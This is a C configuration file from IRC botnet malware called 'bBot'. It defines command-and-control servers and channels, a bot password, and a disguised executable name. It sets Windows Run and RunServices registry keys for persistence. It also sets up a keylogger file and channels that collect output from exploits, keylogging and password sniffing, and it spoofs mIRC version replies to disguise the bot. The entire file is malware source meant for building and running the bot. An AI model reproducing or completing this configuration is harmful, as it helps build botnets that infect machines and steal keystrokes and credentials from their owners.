// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 8001;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 5;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "bbot";						// bot id
char version[] = "bBot-Version 0.6";		// Bots !version reply
char password[] = "index";					// bot password
char server[] = "irc.server.net";		// server
char serverpass[] = "";						// server password
char channel[] = "#channel";				// channel that the bot should join
char chanpass[] = "channelkey";						// channel password
char server2[] = "irc.server2.net";						// backup server (optional)
char channel2[] = "#channel2";						// backup channel (optional)
char chanpass2[] = "channelpass2";						// backup channel password (optional)
char filename[] = "wuamgrd32.exe";			// destination file name
char keylogfile[] = "key.txt";				// keylog filename
char valuename[] = "winnt DNS ident";		// value name for autostart
char nickconst[] = "bBot|";					// first part to the bot's nick
char szLocalPayloadFile[]="sysconfig.dat";	// Payload filename
char modeonconn[] = "+ix";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#channel";					// Channel where exploit messages get redirected
char keylogchan[] = "#channel";						// Channel where keylog messages get redirected
char psniffchan[] = "#channel";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*"
};

char *versionlist[] = {
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC32 v5.82 K.Mardam-Bey",
	"mIRC32 v6.01 K.Mardam-Bey",
	"mIRC32 v6.03 K.Mardam-Bey",
	"mIRC32 v6.12 K.Mardam-Bey",
	"mIRC v5.71 K.Mardam-Bey",
	"mIRC v5.82 K.Mardam-Bey",
	"mIRC v6.01 K.Mardam-Bey",
	"mIRC v6.03 K.Mardam-Bey",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
